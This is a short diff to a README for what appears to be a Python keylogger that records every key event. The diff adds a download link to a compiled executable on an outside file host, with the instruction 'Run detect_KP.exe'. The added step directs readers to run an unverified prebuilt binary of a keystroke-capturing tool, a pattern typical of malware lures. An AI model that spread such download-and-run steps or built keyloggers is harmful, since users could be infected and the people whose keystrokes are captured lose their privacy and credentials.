@@ -3,6 +3,10 @@
 
 This is part of my 'study-the-examples' series, of how certain things can be done in python through 3rd-party libraries. Scripts are designed as accord to me, and not for client use. You can however download and edit them to work on your computer.
 
+## Download
+Full compiled version: [Download here](https://hostr.co/eD41T7PWPBfs)
+- Run detect_KP.exe to execute the script
+
 ## Features
 * Auto-copies every key event
 * Final Compile ('ESC' key to compile)
